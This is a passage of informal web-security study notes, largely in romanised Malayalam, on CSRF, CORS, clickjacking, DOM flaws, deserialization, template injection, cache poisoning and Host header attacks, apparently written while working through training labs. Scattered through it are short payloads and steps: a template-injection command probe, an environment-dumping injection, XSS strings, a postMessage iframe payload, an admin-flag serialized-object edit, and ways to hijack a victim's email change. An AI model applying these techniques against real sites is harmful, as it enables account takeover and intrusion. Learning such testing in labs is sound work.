           Set-Cookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Strict;
14) ee sathana itt kazhinjal browsers default aayi automatically cookes request il add chyuna reethi maarun kaaranam ith vech kazhinjal pine aa particular site il ninum varuna request il mathrame cookies add chyu ilengil add chyila
15) athukond thane oru attacker enn csrf malicious code italum nadakila.strick ittalum kozhapam und athayath oru logged in user matoru thirdparty link ilek poyal avidem user loggin chyenda avastha varum.so ith users athra rasamullathal
16) strick in purame vere oru value koodi und SameSite=Lax; ith itt kazhinjal mattoru site il ninayalum cookie add chytholum but only on 2 conditions:
               a) request uses only GET method./POST methods il onum cookies add chyil
               b)user direct login chyth athil ninum varuna requst ine cookie add chyu allathe matoru sthalath ninu link click chyth keriyal cookies add chyila
17) Using `SameSite` cookies in `Lax` mode does then provide a partial defense against CSRF attacks, because user actions that are targets for CSRF attacks are often implemented using the POST method
18) ee lax upayogikunathinum rand kozhapangal und :
        a)Some applications do implement sensitive actions using GET requests.
        b)Many applications and frameworks are tolerant of different HTTP methods. In this situation, even if the application itself employs the POST method by design, it will in fact accept requests that are switched to use the GET method.
19) samsite cookie mathramayi csrf in against upayogikaruth.samesite cookie enath oru addtional defense aayi mathram kandal mathi
20) post request vazhi mathraman namuk oru action chyan patuka web aapil.GET req vazhi contents edukan mathrame patu but chela samyangalil namuk post mati get aaki actions chyan patumon nokam aakunengil ath vech csrf chyan patumon nokuka
21) csrf token il enthengilum letter add chyth send chyth nokuka error vanal athinartham server token validate chyunund ennan
22) oru session cookie ennal namuk ariyam athil user inte ella detailsum undakam.so satharana csrf undakumbol ath session cookie yumai mingle chythitundavum.athayath oru session cooke kk athintethaya csrf mathrame undakan paduloo enal ella website ilum ingane implement chyanamenila.so ath check chyanam.athayath mattoru account inte csrf token eduth namude csrf umayi replace chyth noakanam.
23) so csrf um session cookie um thamil connection ilengil namuk vere valid aaya csrf vech nokam
24) email,password,angane ulla pala karyangal change chayan aayi enthayalum oru button click chyumallo apol ath right click chyth inspect element adich nokiyal namuk aa user inte csrf token kaanan kazhinjekum
25) namal oro thavana page refresh chyumbozhum csrf token maram so namal matoru account il ninum csrf eduthal pine ath refresh chyan padila.refresh chythal puyhiys token varum pine namal copy chythath valid alla
26) namuk enth action chyumbozhum athini csrf mathramala enthayalum ath correct aayi chyan areelengil kozhapam ila namuk `<img src="x" onerror="koduth">` aa karyam execute chyan patumon nokuka -lab5
27) ivide lab5 il csrfkey ennan cookie de peru ullath.enumvech epozhum angane thane undakanamenil.cheapo cookie: session=jlfjdslfjdsjflsj... ; csrf=sdlfdlfj... ennayirikum undavuka
28) csrf token um csrf cookie yum thamil connection undon nokanam.chelapo randum thudangunatho avasanikunathe ore reethiyil aayrirkum so randum study chyuka
29) ivide lab6 il csrf cookiyum csrf token um oru same value thane aan.so ivide double submit/check chyunu server.athayath randintem value backend il ullathe pole same aanengil mathrame accept chyu.so ivide rand sathanathinum same value aayathkond namuk same aaya oru word(test) enn randinum value aayi koduthal ith accept chyo enn nokunu.ivide ath accept chyunu
30) pakseh namuk csrf attack nadathumbol csrftoken mathram aanengil kozhapam ila but csrf cookie kode undengil namude csrf script il ee csrf cookie add chyanam.karanma server ee rand sathanavum nokite accept chyu.so epozhum csrf cookie inject chyan patuna sthala site il evidelum undon nokanam
31) csrf poc peten test chyan poc undakit test in browser button click chythal aa csrf script adangiya url kitum athilek poyal kanam email change ayo ilayyo enn.ivide lab7 il ingane test chyumbol `ivalid refere header` enna kanikunath
32) eth page il ninan request originate chythath ennariyan vendi aan referer header use chyunath.ith vazhi csrf prevent chyan kazhiyum.ivide lab7 il host: il site name um referer: header il vere name um aan ullath athukondan ee error varunath.so namal referer header modify oke chyth test chyanam
33) CSRF tokens are placed into requests and passed to the server to validate when requesting

==============================================================

### CORS:
1) when we have the same scheme,same origin and same port(https,http varumbol port kodukil karanam athinte defult ports aan use chyar ie,443 and 80) regardless of the path,it is considered to be the same origin
2) namal oru site ilek request ayakumbol correct aaya origin aayirikanam athil vendath.athayath ipol https://josu.com ilek pokan athupole thane kodukanam http:// enn koduthal different scheme aayi apol same origin alla.so correct scheme,domain,port udayale browser accept chyu
3) domain josu.com ennath hobby.josu.com eenayal domain mari athum same origin alla.==same origin aano ennariyan moon karyangal aan nokendath 1) same scheme 2)same domain 3)same port==.domain in shesham varuna path bhadakamalla
4) http header il namal kanuna `host: header` ennal namuk eth site il ninan data edukendath (if GET) allengil eth site ilek aan specific action nadathendath (if POST)
5) athuple `origin: header` ennal ariyalo current url/site address.origin kodukumbol http:// ennu aadyam kodukanam
6) namal test chyumbol response header il Access-Control-Allow-Origin oke kandal athinartham server cors use chyunund ennan artham
7) ==Access-Control-Allow-Credentials response header allows credential to be passed in the request(athayath request il ulla credentials) that could be cookies,authorization headers,certificates... request il nokiyal manasilakum enthan use chyunathen==
8) chela applications whitelist use chyum.athayath cors request nadakumbol origin aayi kituna url already whitelist chyapeta list umayi compare chyum.aa list il ee origin undengil accept chyum
9) request il origin: header test chyumbol veruthe url kodukathe aadyam server accept chyuna origin enthanen nokuka enit aa same origin subdomain add chytho allengil athinte koode vere url oke koduth server accept chyunundon nokanam
10) origin: headeril url koduthint accept chyunilengil :null ennu value koduth test chyuka.apol chelapo namuk Access-Control-Allow-Origin header response il tharumayirikum
11) responseil verum Access-Control-Allow-Origin:null enna mathram aanengil namuk aa app inte public resources/data mathrame kitu.pakram Access-Control-Allow-Credentials:true ennu undengil namuk private resourses um edukan patum
12) null vechula exploit aanengil athoru sandbox iframe element inte ullil aayi venam script chyan
13) cors miscofiguration il originil varuna url il xss chyan patumengil athil ninum namuk important credentials xss vazhi edukan patum.athayath request i:
      origin: `https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`   enn koduth test chyth nokam
14) chela application cors inayi origins whitelist chyumbol http:// ulla urls um add chythitundayekam.apol oru attacker middle il ninn user traffic intercept chyth cors configuration exploit chyam.apol attackerin origin: `http://trusted-subdomain.vulnerable-website.com` enn koduth chyam.ingane chyumbol attacker in https:// aayitulla website use chyth victim ine nallapole patiikam ith real website thane aan enn viswasipikan
15) so namal origin: header test chyumbol https:// ennath http:// koduth url accept chyunundon nokanam
16) ==API->==rand program/platforms thamil communicate chyan use chyuna sambavaman api.athayth namuk food venam so namude food appil ninum food order chyumbol ath aduthula ethengilum restaurant il ninan food kituka so aa restaurantin athintethaya program/app undakum so namude food appum aaa restaurantinte food appum thane communicate chyan api use chyunu
17) rand difrnt languages il undakiya app ukal thamil oru problem ilathe communicate chyan api use chyunu.api use chyumbol namude app il ninum purath pokenda avstha varuila.athayath googlinte api use chyan googlilek pokendathillenn
18) ==API_KEY->== generally speaking it is a value that simply identifies our application and requests. api use chyenengil namal aa oru service/app inte real user aayirikanam(ella usersinum oru unique api_key kitum).ee unique api key oru user in kitiyal mathrame aa user in aa appile api service use chyan patoo
19) so apikey use chyth oru api request chyumbol aa service in namale identify chyth athintethaya response tharum.Therefore an ==api_key is for identificatioln and authorization==.so namude api_key vere oralk kitiyal namalayi ayalk api service use chyna patum.athupole thane namude chyuna requests um ee api service api_key vech track chyum.ithin randinum vendiyan api_key use chyunath ie,identification and tracking
20) api service thane aan ee api_key valid aano enoke check chyunath.valid allengil service error tharum
21) ivide ull labukalil namal login chyumbol /GET /accountDetails enna request vazhi namuk details kitunu athil namuk apikey kitunund.aa same response il thane aan Access-Control-Allow-Credentials: true ennum varunath.so ipozhan enik kathunath.athayath ee request inte response il api key namuk tharunund so aa apikey kitan vendiyaan nammal ee cors vechula exploit chyunath.allathe veruthe cors vulnerability mathramayi chyan vendiyalla
22) cors test chyumbol origin: https://test.realorigin.com enn koduth nokumbol kanam subdomains accept chyunun.so ingane subdomains accept chyunundengil aa url il evidengilum xss chyan patumengil namuk athil xss payload koduth api key kitan nokam
23) `Access-Control-Allow-Credentials: true` enna sathanam response il varumbozhan CORS attack chyan ulla possibility ullath.Without this header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content

==============================================================

### Clickjacking :
1) Clickjacking attacks use CSS to create and manipulate layers
2) iframe ennal oru html element aan.oru website inte ullil thanne mattoru website load chyikan use chyunathan ith. eg: `<iframe src="target website url></iframe>"` ee code oru pageil koduthal aa pageil ee iframe varum.ithin height width oke koduthal mathi(use css)
3) athayath real aaya oru wensite iframe il kodukunu enit athinte transperency kurakunu enit athinte molil namal vere enthengilum "click me" enno mato koduth chyunu.ee click me ennath oru `<div` element il aakunu enit ee divum namal css vech correct venda sthalath aakam
4) div il namal kodutah word correct backil ulla button umayi align chyuka.so aa word il hover chyumbol mouse pointer maari hand juster aayi marum maaranam enale aavu
5) namal attack chyuna site iframe support chyunundon nokanam illengil clickjacking aakila
6) burp il menu bar il poyal "burp clickband" enn option und ath vech namuk csrf poc undakunath pole automatic aayi chyam
7) cheala formil okke automatic aayi input fill ayirikum.eg:password matuna samayath email already fill ayirikum so ath nokuka
8) chela form il namuk thane input kodukam.athayath url il ?email=evilmail@gmail.com enn kodukam
9) burp il poi nokumbol email change chyuna request /POST aayirikum so request method change chyth GET method aakuka enit aa url path iframe tagil src il aaki test chythnokuka apol reqeust pokumgol namal path il email enn parameter koduthathkond automatic aayi aa input fill aayikolum.ingane test chyumbol burp il aadyam send adich test chyth nokuka 200ok kanikunundon
10) sredhikuka namal post enn request mati get aakumbol athile change email/ enna path remove chyanam.enit ?email=hacker@gmail.com ennadikiumbol email change aakila pakaram aa email parameter il value aayi maarum.aa input inte ullil ee hacker@gmail.com enn kidakum burp il render adich nokiyal kanan patum
11) Clickjacking attacks are possible whenever websites can be framed
12) clickjacking prevent chyan vendi frame busting enna technique use chyum browser or platforms.An effective attacker workaround against frame busters is to use the HTML5 iframe `sandbox` attribute.ithin value allow-forms enn koduthal clickjacking chyan patiyekum. athayth `<iframe sandbox="allow-forms" src=...>` enn koduth test chyam-lab3
13) ==puthiya oru logic kity->athayath input oke ulla pageil namuk ithupole oru get request undaki athil thane path parameter aayi ee input ile name koduthal mathi.enit ee link oru phising pole chythnokan sremikanam ok.namauk ariyam /POST request ukalil kanuna parameter name(not vlaues) ennath html  ukalude attribute(<`input name="josu"` -> josu ennathan udheshichath) value aan.so namuk burp il ninum parameter names kitum
14) iframe use chyumbol src= aavunilengil ingaen chyth noku : `<iframe srcdoc="<script src=/theme?cb=alert ></script>">` randamathe src yil noki path kodukuka(ith work aakuvon areela ennalum nokiko).ingane CSP bypass chyan patumon nokuka.satharan src framing allow chyarila but namal ivide src load chyukayalla chyunath vere entho document load mato entho chyukayan
15) 
==============================================================

### DOM-based vulnerabilities :
1) Fundamentally, DOM-based vulnerabilities arise when a website passes data from a source to a sink, which then handles the data in an unsafe way in the context of the client's session.athayath namal kodukuka input allengil namuk control chyan patuna parameters,messages oke server nere oru js function ilo allaenigl oru DOM objectilo kond idum.angane namal contorol chyunath dom il idumbol avide ath save aayi kidakum.angane save aakumbol naaml athil xss oke chythal stored xss pole aakum
2) The most common source is the URL. karanam url il namuk enth input koduth controll chyan patum.An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL
3) If a page handles incoming web messages in an unsafe way, for example, by not verifying the origin of incoming messages correctly in the event listener, properties and functions that are called by the event listener can potentially become sinks
4) addEventListener varuna messaginte origin verify chyunilengil ath oru vulnerability aan.namuk oru fake site iframe vazhi use chyth `contentWindow.postMessage('print()','*')` ee reethiyil postMessage method koduth namuk venda karyam execute chyam
5) oru karyam ormikuka javascript code html inte ullilum und.prathyekam oru .js file il aayitum und.namal inspect chyth nokumbol kanuna `<script` ennath html il thane ulla script aan.file il ulla scripts kananengil debugger tool il poi edukam ok.ivide lab 1 il namal home page il inpect chyumbozhan ee addEventListener il message inte origin check chyunila enn kandath. athukond aa dom namuk manipulate chyam
6) javascript has many build in function.one of them is eval() . eval basically means evaluate. to evaluate a function or expression
7) ee `postMessage()` enna method aan target site ilek message ayakunath.athukondan namude iframe payload il ee method use chyunath message ayakan
8) ==As long as a website accepts web message data from an untrusted source due to a lack of adequate origin verification, any sinks that are used by the incoming message event listener could potentially lead to vulnerabilities.==
9) enthengilum karyam access chyumbol url il ...?id=5 enn kandal athinte koode vere oru url enno mato peru koduth malicious url kodukam like ..?id=5&url=malicious.com
10) site il view-source adikumbol code il `<a href='#' onclick='re...` enn kandal aa href il # enn sathanam maati namuk oru malicious aaya url allengil vere enthengilum koduth test chyam
11) website use chyumbol back ilek pokanayi special button undengil athil open redirection undon check chyanam
12) type chyuna sthalangalil `[hello](https://googl.com)`  enn koduth nokuka chelapo open redirection aakumayirikum
13) javascript il location.something ulla js code iloke dom-based open redirection undakan chance und
14) webapps dynamically redirection targets set chyunathkondan ingane ulla redirection vulnerabilities undakunath
15) ithupolulla parameter il open redirection mathramalla IDOR,XSS,SQL i ... polula vulnerabilities um try chyam ok
16) cookie: headeril oro puthiya cookie yum add akunath sredhikanam
17) DOM is a method to access all html elelments
18) document is the root of any website.document->html->head/body  ingane aan hierarchy varunath.so html ile enthum document in access und
19) inspect->console il poi window. ennadichal namuk kanam windows. il enthoke unden.ithil athikavum defualt aaya eventhandlers aayirikum.athonum overwrite chyan patila.like onload , blur , onclick... but ithallathe vere undakum default allathath ath developers idunath.so athan namal overwrite chyth dom clobbering chyunath
20) html injection chyan patuna sthalath clobbering chyan patumon nokuka
21) ==dom clobbering test chyan evidengilum html code chyan patumon nokuka.patumengil `<div id=hello>test html </div` so ingane chythal error onum varila karanam html already accept chyunathkondanalo ingane chyunath.pakshe ingane chyumbol ee id enna attribute ile value dom il save aakunund.ath manasilakan ->inspect->console il poi window.hello enn adichal kanam ee code kidakunath.so window.hello namude ee div ine point chyunu==
22) ivde live overflow utube videoyil window.load_debug enna oru code und.athinte koode entho function um und so site load chythathin shesham entho particular action nadann kazhiyumbol aan ee funtion execute chyuka.but ivide site il evidengilum namuk html inject chyan patunathkond namuk `<div id=load_debug>test div</div>` enn koduth ee div dom il aakam.ini console il poi nokiyal kanam load_debug is not a function enn.athinartham namude load_debug div dom il aayi so ini js load_debug enna vere enthengilum sathanam kandal error kanikum already athupole oru sathanam div aayikidakunund
23) view-source adichit html,js il oke location.something il oke open redirection undon check chyanam.like aa name attribute url il parameter aayi koduth https://google.com enoke koduth nokuka
24) 

==============================================================

###  WebSockets :
1) oru websocket ilek maranengil aadyam http handshake nadakanam.so first http vazhi request nadakunu enit aa request inte response aayi upgradation nadakunu enitaan websocket communication nadakunath ok.so first nadakuna http handshake reqeust study chyuka like csrf undo,origin header correct aayitano implement chythath oke ok
2) http/https use unidirectional communication.athayath sender oru request trigger chythale response kitu
3) Websockets are bidirectional.athayath sender can send the data and the receiver can also send the data(sender enthengilum request ayachale server enthengilum ayaku enna paripadi ivide illa) eg: chat application.so browser il namal chat window open chythu enit namude friend in oru hai ayakunu.apol ee mesg server ilek pokunu enit server aan friend in ee hait enna msg ayakunath.so sender um data send chyunu server um data send chyunu
4) websockets il origin vulnerability undakum.so correct aayi origin validate chyanam ilengil cors polula exploit undakam
5) session handling in websocket handshake verum http cookie yil mathram rely chyunath nallathall.csrf token koodi use chyanam.csrf token illengil ath nallathalla.athayath cookie vech mathram session handle chyan padila
6) athikam ella logicum main page il und nokiko

==============================================================

### Insecure deserialization :
1) deserialization vulnerability undo enn test chyan source code il unserialize enn search chyth nokuka.PHP polula languages il aan ith undavuka
2) serialize ennal complex aaya data structure like objects oke oru prathyeka sthalathek like database ilek oru pratheyeka format il save chyunathan
3) ==evidengilum deserialization nadakundengil burpil (targt->issues) kanikum.so angane ariyan patum==
4) deserialzation ennal serialize chytha objects oru sthalath save chythite so aa sathanam retrieve chyunu athum athinte original formil enganeyano undayrunath athe form il thanne ok
5) session cookie il ulla sathanam copy chyth decoder il poi base64 decode chythal namuk ariyan patum ith serialized chytha sathanamanon
6) .php veruna files namal target(burp) il ninum nokumbol kandal ath repeater il iduna enit aa url pathinte last aayi ~ ee sign ittal namuk php code kanan patumena parayunath
7) `O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}` ingane oru serilaized object kiti enn vecho.so namuk attributes modify chyth deserialization attack chyam. ivide isAdmin enn atrribute inte value ennath b:0 aan athyath boolean and zero means false so namuk ath maati b:1 enn kodukam one means true.so ingane attribute value maatit pine sadharana pole re-encode chyuka aa object enit send chyuak
8) session= cookiyil ulla value chelapo aadyam url decode chyendivarum enitayirikum base 64 decode chyendath enale chelapo kanan patoo
9) serialized object binary format aanengil Hackvertor enna extension burp il add chyth modify chyuka.
10) With Hackvertor, you can modify the serialized data as a string, and it will automatically update the binary data.
11) namude real account delete chyuka enit ath intercepter il vech eduth repeater il iduka enit drop button click chyuka apol delete aakila.so ini athile oru cookie yum pine email il namude email undakum.so aa email="[ouremail@...com , victimemali@.com]" oke itt test chyam.ivide session cookie aan test chyunath.ivide ee session cookie deserialized aayitan kanikunath so athil pala test um chyuka
12) athayath namude account delete chyan aayi server namude account details edukunu.ee edukunna process deserialization vazhi aan edukunath.athukondan namuk ath aa session cookieyil ninum kanan patunath.athukondan namuk pineed ee serilized object modify chyan patunath ok -lab-3
13) ==nammal enthengilum action chyumbol aa action vendiyulla details oke server edukum aa edukuna reethi chelapo deserialization process ilude aayirikum edukuka apol namuk ath requets/responsilo chelapo aa object kanan patiyekum angane kanan patiyal aan namuk ath modify chyan patuka ok==
14) **GADGETS** -> Parts of code that we have access from the website.blackbox testing chyumbol nmauk source code undayirikila.so .php polulla files oke kitiyal athil ninum source code(~) kitumon nokuka
==============================================================

### Server-side template injection :
1) nammal enthengilum action chyumbol athumayi bhandhapett enthengilum message aa same page il kanichal avide ee vulnerability undon check chyanam.athayath click chythathin shesham aanalo msg browser il varunath.so click chythath naaml intercept chyuka enit athil message ull reqeust il namal message remove chythit `7*7` enn kodukuka apol 49 eno allengil 777777 enok kanikum.angane kanichal ee vulnerability unden urapp verutham.engine anusarich test chyanam like `<%=7*7 %>` .49 enn kanichal namuk `<%=system("whoami") %>` test chyam
2) xss test chyunapole namuk SSTI check chyam athayath namal kodutha input evidengilum reflrect chyunundon nokam.reflect chyunengil avide `7*7` test chyam.ith mathramala namal chyuna enthengilum action browser il reflect/save chyunundengilum check chyam
3) evidengilum input chyan patumengil avide lab-2 yil ulla 7 inte payloads ittit save chyuka apol ariyam athil ethengilum 49 kitumon
4) ==oru karyam sredhikuka namal store chyuna sthalangalil input il eevaka payload idu test chyumbol /POST reqeust aayitan pokuka.so namal store chyuna comments,description... oke delete/update chyan patatha reethiyil aan save chyunathengil aa request poyathin shesham template error vannal namuk pine onum chyan patila karanam namuk delete chyan patila namal input aayi koduthath so ath namal arinjirikana.be carefuk== so aadyam normal comment itt test chyuka ok
5) site il namuk nammude discription type chyth save chyan oke chyunaduth ith undon nokanam
6) athayath already site il template codes undakum namal enthengilum type chyumbol aa template code il static code um undakum athupole dynamic code um undakum.namal type chyth save aakuna sathanam ee dynamic code ilek save chyum.save chyunath eth engine aano use chyunath athinanusarich irikum.so angane namude input save chyuna sthalangalil `7*7` test chyth nokam
7) namal login chyumbol welcome joseph enn kandal avide check chyam karanam joseph ennath dynamic aayi save aakunathan . so login chyuna request intercept chyth ee msg eth request il aano varunath ath kandethuka enit joseph ennath mati `7*7` test chyuka
8) burp il intruder->options->grep-extract enthenal ethengilum oru div select chyuka enit start attack kodukuka apol aa div il ulla karyangal namuk aa result il thane eduth kanikum athinana ee sathanam use chyunathburp il intruder->options->grep-extract enthenal ethengilum oru div select chyuka enit start attack kodukuka apol aa div il ulla karyangal namuk aa result il thane eduth kanikum athinana ee sathanam use chyunath.apol dynamic aayi varuna messages inte div ithupole select chyth intruder il SSTI yude payloads itt test chyumbol aa div il ull akaryangal eduth kanikum - Lab1
9) SSTI test check chyumbol `${{<%[%'"}}%\` ithupole ulla strings itt nokuka url il aayalum ini /POST request ile parameter il aayalum ok
10) user.name,  token.value    ingane aadyam enthengilum peru undakum athin shesham dot itt athinte koode vere oru name oke undengil athoke note chyuka . athoke template dynamic aakuna codes aayirikam ok. like `blog-post-author-display=user.name}}{%2....`  ivide kandile value automatic aayi user.name ennayi.namal input koduthitundavanameniila. enthengilum special button click chyumbol namuk application automatic aayi tharunathayirikum ok
11) in Java-based templating languages, you can sometimes list all variables in the environment using the following injection:   `${T(java.lang.System).getenv()}` 
12) chela samayam user.name ennath namal user.na0kfkjso enn kodukunapole chela samayam verum user enna aa reference enn mathram aaki nokuka apol chelapo error varumayirikum

==============================================================

### Web cache poisoning :
1) caching enthinan use chyunathenal namal oru page request chyth kityen vecho enit namal aa same page pinem pinem refresh chythondirunal oro thavanayum aa request server il poi response tharanam angane epozhum server il poi response tharenda aavisham ila.so athukondan caching enna sathanam introduce chythath ok
2) ==POST requests are never cached==
3) XSS, JavaScript injection, open redirection... ingane ullathoke web cache poisoning vech chyan patum
4) ==epzhum response il age: 13 pole ulla numbers aano atho epozhum zero thane aano varunath enn nokuka.zero kk pakaram vere numbers aan kanikunathengil avide caching nadakunu ennan artham==
5) namal poison chyan use chyuna header unkeyed aano enn mathramala athile value response il reflect chyunundo enn koode nokanam ennale namuk xss polula exploit chyan patu
6) nammal aadyam vulnerable aaya oru header parameter (unkeyed) request il kandethanam enit  athil payload inject chyanam.enit aa payload cache chyunundon nokanam
7) cachekey=requestline+headers  .  so ee keys same aanengil athinte values um same aanengil nere cache il ninum namuk response kitum.allengil direct website il ninum namal response edukengi varum
8) param miner upayogich aa request il ulla unkeyed aaya hedars,values oke kandupidikam
9) x-cache: hit ennal namuk response kitunath cache il ninan .miss ennanengil website il ninan response kitunath
10) namuk manual aayi enthengilum new header um some value koduth send chyth nokam.enit namal kodutha sathanam response il reflect aakunundon nokanam.angane athuvazhi namuk unkeyed inputs undon manasilakum
11) param miner use chyth ith automate chyam.right click chyth guress header option select chyth namuk test chyam
12) param miner use chyumbol automatic aayi cachebuster techniques use chyt path il oru extra sathanam itt namude payload mattu user ilek pokunilan urapp varuthunund.but namal manual aayi chyumbol namal thanne chyanam like `/en?safe=1` ennath request path il iduka ok
13) namal kodutha arbitrary input response il reflect aakukayum enal ath server sanitize chyandirikukayum chyenengil avide web cazhe poisoning attack possible aayirikum
14) namal oru request http history il ninum edukuka apol aa request il x-cache: hit enn kandal athinartham ath cache il ninum varuna response aanenan ok.aa same request ini repeater il kondpoi iduka enit athil puthiya oru unkey undaki itt send adikuka apol kanam x-cache: miss so ath cache il ninum varunathal so ini aa same request onukoodi send chythal miss mari hit aakum so athinartham aa response ipo cache il ninuman varunath.so ipol aa response cache il save aayi 
15) cookie yil ulla value change chyth enthengilum kodukuka apol ath athepole reflect chyunundon nokuka.angane undengil namuk web cache poison oke test chyam
16) oru request il aadyam x-forwarded-host: example.com kodukuka enit reflect chyunundon nokuka.enit x-forwarded-scheme: https aatum koduth cache theerunathvere send chyuka apol namuk 302 kitynundnegil ath redirect chyunu ennanartham.so x-forwarded-host: google.com , x-forwarded-scheme: nohttps koduth send chyth nokiyal chelapo namuk openredirection kandethanayekum
17) `Age: 174 Cache-Control: public, max-age=1800`    ingane oke response il kandal namude joli eluppam aakum.ivide max-age 1800 aan so aa time aakumbol caching nadakum apol namuk aa time il poison chyan patum.so ingane ulla informations oke check chyanam
18) vary: header il ninum namuk informations kitum. satharana unkeyed aaya headers oke ee header il idum.apol namuk manasilakan patum ithil kodutha headers um keyed aan enn.vary: useragent undengil namuk venda victims use chyuna useragent ethanen ariyanam
19) age: 0 enn kanumbol manasilakuka puthiya caching nadanu enn.oru limit kahziyumbol puthiya caching nadakum
20) request ile host: website.com il website:1  enn kodukuka enit send chyuka apol 301 angane enthenilum response vannal athinartham status ok aan x-cache: hit ennum kandal athinartham port keyed alla ennan.port number check chyunila.so enth port koduthalum cache il nin thane response vanolum.so port number ennath unkeyed aan so namuk athuvech poison chyam prathyekich cloudflare use chyuna site
21) /GET /?message=hai   enn ulla sthalath /GET /message=hai&cb=123 ennkoduth send chyth nokuka enit hit aano miss ano varunath enn check chyuka ok
22) /GET /   path il xss test chyumbol / il ? itt script koduth test chuka apol cache behaviour vazhi baaki ulla users in xss aayekum ie, `GET /?"><script>alert(9)</script>` 
23) request line + headers aanalo mainly cache key ennariyapedunath.ennal ee keys il thane unkeyed karyangal undakum.mukalil paranjapole host: innocentsite.com:123  enn kodukumbol port number enthkonduthalum x-cache: hit enn thane kanikunu.athupole namal url path ilum namude budhikanusarich enthengilum oke chyanam.athayath keyed aaya karyangalil extra karyangal itt ath unkeyed aano allayo enn check chyanam.ingnae arbitrary port koduth caching nadakunundengil namuk enthengilum oru port kodukam apol aa cache theerunath vere oru denial of service attack nadakum.karanam ella users um ee oru dead port ilek pokum.ee port il strings idan patumengil namuk xss oke test chyam
24) namude unkeyed input enngot pokunu evide reflect/store chyunu angane ulla karyangal nokanam.ivide athikam lab il or javascript url il dynamic aayi append chyunakayan.so aa js file application edukan nokunu.so namal control chyuna webserver il ithe path undaki vekuka enit dynamic aayi namude server url kodukuka repeater il.
25) ella response ilum hit,miss enn kanikila.ath kanikathath kond thane aa response cache chyunila enu vijarikaruth chela application il ith kanikila so caching nadakunundon detect chyunath hard aan
26) GET /    enn request il kandal  aaa   / il   /?evil=something kodukuka apol hit enn thane kanikunengil aa query unkeyed aan pakshe cachiil nin thane aa reaponse varunath
27) url path il mathramala keyed aaya headers ilum namuk cache buster add chyth test chyam.ie, `Origin: https://cachebuster.vulnerable-website.com OR jusy orogin: hacker enn italum mathi` (but keyed aayitula header aayirikanamennn thonunu) . so namuk query parameter il unkeyed aaya sathanam kandethan patiyal namuk cache butster venamallo so athin namuk heders il cache buster itt request test chyam
28) ==If the response to your request is cached, you can remove the query parameters (/?hacker=123) and they will still be reflected in the cached response.==.so ini namuk avide xss payload ithpole cache response il save chyam apol cache theerunath vere aa xss work aakum
29) namal url il allengil puthiyathayi oru unkey cherth send chyumbol namuk varuna response il cache: miss ennanengil athinartham ath cache keyumayi bandhapett kidakunathan so namuk aa sathanam vech poison chyan patila -lab6
30) url il aanengilum evide aanengilum namal aayi key ittal namuk response hit venam. chelapo miss ayirikum kityka athum chelapo response il reflect aakum pakshe karyamila karanam hit kittathidatholam namuk poison chyan ulla sadhyatha illa -lab6
31) If you can work out how the cache parses the URL to identify and remove the unwanted parameters, you might find some interesting quirks.  ?  /  &  ee sathanagal oke url engane parse chyunu enn study chyuka. EG :  `GET /?example=123?excluded_param=bad-stuff-here`   ee example nok.here , the cache would identify two parameters and exclude the second one from the cache key. However, the server doesn't accept the second `?` as a delimiter and instead only sees one parameter, `example`, whose value is the entire rest of the query string, including our payload. If the value of `example` is passed into a useful gadget, we have successfully injected our payload without affecting the cache key.
32) enth paraemter,header aayalum ath keyed aano ennariyan athil oru value kodukuka enit send adikuka addyam miss kitum pine hit kitum enit aa value il vere enthengilum add chyuka enit send adikumbol hit aan kitunathengil athinartham aa parameter application check chyunila ie, ath keyed cache alla.miss aanengil ath keyed aayitan application nokunath - lab7
33) sensitive aayula informations varuna requestinte response il cache inga nadakanamenila.like GET /profile request ethra pravisham send adichalum age: 0  enn thane kanikum.so atinartham aa response direct application il nin thane aan varunath ennan.pakshe athe application il static files oke cache ing chyumayirikam like .css,.js  oke.so apol namal enth chyanamenal GET /profile/nonfile.css ennu koduth send chyuka apol application ee .css enna extension kanukayum ith cache chyam enn theerumanikukayum chyum so angane namuk cache poison chyan patiyekum
34) eth response ilum caching undakam.ie, oru image kituna response aanengil polum vidaruth athil caching nadakunundakam

==============================================================

### HTTP Host header attacks :
1) application il host header injection test chyumbol response il server: cloudflare enoke kandal aa domain test chyenda avisham ila.karanam CDN use chyunengil host header injection nadakila
2) Attacks that involve injecting a payload directly into the Host header are often known as "Host header injection" attacks.
3)   -   Web cache poisoning
-   Business logic flaws in specific functionality
-   Routing-based SSRF
-   Classic server-side vulnerabilities, such as SQL injection
    ithupolulla vulnerabilites host header attack vazhi chyan sathikum
3) host header il enthengilum extra sathanam itt test chyth nokanam.apol athikam error veram. error veratha situation undakum athayath extra sathanam ittitum oru kozhapam illathe site load aakunundengil namal ath further test chyanam.karanam ennale namuk athil nadakuna behavior manasilakan patu
4) arbitrary sathanam host il itt send chyumbol "`Invalid Host header`"  ennayirikum response varuka.ella response um ingane aayirikanamenila.so varuna response in anusarich forward chyanam
5) host header il port check chyunundon nokanam.check chyunilengil avide namuk payload chyan patumon nokanam

                        GET /example HTTP/1.1 
                        Host: vulnerable-website.com:bad-stuff-here
6) oru duplicate header koduth test chyuka.athikam block aakum.but chela samayam intresting aaya respones kandekam
7) duplicate header il space itt test chyuka:

                    GET /example HTTP/1.1 
                         Host: bad-stuff-here      (ingane space itt test chyuka)
                    Host: vulnerable-website.com
8) `#3 Inject host override headers`   ithil ulla points oke poi vayik important aan
9) namuk host header change chyan patunengil actions nadathuna request il chyth nokanam.like email change chyuna request il host mati exploit server kodukuka enit namuk change chyan aayi veruna link il chelapo namude exploit server ayirikum host aayi kidakuka apol namuk matoru user in email change chyuna request ayach kodukam. lab2
10) In Burp Suite, you can use the Param Miner extension's "Guess headers" function to automatically probe for supported headers using its extensive built-in wordlist.
11) password reset chyunath namuk namude emaililek avar ayach thannal chelapo link aayitayirikum allengi just oru button pole aayirikum.link aanengil aa link eduth matoru tab open aaki load chyth repeater il oke itt test chyam.button aanengi right click chyth copy link location eduth nerthepole thane test chyam
12) ini ee vana link click chyth aadyam normal aayi password reset chyuka apol request il oke enthan nadakunath enn nokuka.enth karyam chyumbozhum aadyam genuine aayi chyuka enit venam malicious aayi test chyan
13) Every HTTP header is a potential vector for exploiting classic server-side vulnerabilities, and the Host header is no exception. For example, you should try the usual SQL injection probing techniques via the Host header. If the value of the header is passed into a SQL statement, this could be exploitable.
